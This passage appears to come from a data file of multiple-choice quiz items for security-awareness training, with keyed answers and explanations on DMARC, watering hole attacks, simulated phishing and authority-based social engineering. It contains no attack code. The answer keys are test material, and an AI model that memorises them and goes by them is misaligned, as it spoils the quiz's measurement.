delivery", "B. Emails failing SPF/DKIM authentication are rejected — prevents domain spoofing", "C. Internal emails only are accepted", "D. All email requires password confirmation"], answer: "B", explain: "DMARC p=reject: when email claiming to be from company.com fails SPF and DKIM checks (spoofed), the recipient server REJECTS it. Spoofed emails never reach the inbox. Eliminates technical ability to spoof your domain. p=quarantine sends to spam instead." }, { q: "Watering hole attacks are harder to defend than phishing because:", opts: ["A. They use more sophisticated malware", "B. Targets visit legitimate, trusted sites that have been compromised — no suspicious link to avoid", "C. They bypass email filtering", "D. They require physical access"], answer: "B", explain: "Watering hole: compromise a legitimate website the target visits regularly. Victim visits normally — no suspicious email to avoid clicking, no fake domain to spot. Defence requires: web proxy reputation filtering, browser isolation, EDR detecting exploitation." }, { q: "Simulated phishing is the most effective training because:", opts: ["A. It is cheapest to run", "B. Experiential learning with immediate feedback produces higher behaviour change than classroom training", "C. It permanently prevents phishing", "D. It identifies employees to terminate"], answer: "B", explain: "When employees click a simulated phishing email, they immediately see training showing what clues they missed. The moment of failure + immediate learning = highest retention and behaviour change. Tracks trends over time — click rates should decrease with repeated campaigns." }, { q: "Authority as social engineering technique:", opts: ["A. Requires physical intimidation", "B. Impersonating CEO, IT, or government to increase compliance with requests", "C. Using technical jargon to confuse targets", "D. Offering rewards for compliance"], answer: "B", explain: "Authority: people comply with perceived authority figures.
